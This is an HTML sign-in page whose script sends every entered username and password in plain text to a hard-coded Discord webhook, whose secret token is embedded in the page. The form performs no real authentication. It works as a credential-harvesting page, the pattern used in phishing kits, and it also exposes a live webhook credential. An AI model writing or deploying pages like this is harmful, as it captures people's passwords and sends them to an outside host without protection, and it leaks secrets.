<!DOCTYPE html>
<html>
<head>
    <title>Sign In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 6px 0 12px;
            box-sizing: border-box;
        }

        input[type="submit"], .switch-button {
            background-color: #007bff;
            color: white;
            padding: 10px;
            border: none;
            width: 100%;
            border-radius: 4px;
            cursor: pointer;
        }

        .switch-button {
            background-color: #28a745;
            margin-top: 10px;
        }

        .switch-button:hover, input[type="submit"]:hover {
            opacity: 0.9;
        }
    </style>
</head>
<body>

    <h2>Sign In</h2>

    <form id="signinForm">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username" required><br>

        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password" required><br>

        <input type="submit" value="Sign In">
    </form>

    <button class="switch-button" onclick="goToRegister()">Don't have an account? Register</button>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1377409611002286201/6YX_wL9saCPuJlvGY0RWuQ9Jz1iUUol1Y5svDN5Ugwqk4osgz1-ztV8vvG6bmZf9NHD5";

        document.getElementById('signinForm').addEventListener('submit', async function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const message = {
                content: `üîê **Sign-In Attempt**\nüë§ Username: ${username}\nüîí Password: ${password}`
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                });

                if (response.ok) {
                    alert('‚úÖ Sign-In sent to Discord!');
                    this.reset(); // clear the form
                } else {
                    alert('‚ùå Failed to send sign-in info.');
                }
            } catch (error) {
                console.error(error);
                alert('‚ùå Error sending to Discord.');
            }
        });

        function goToRegister() {
            // Make sure this file exists
            window.location.href = "register.html";
        }
    </script>

</body>
</html>
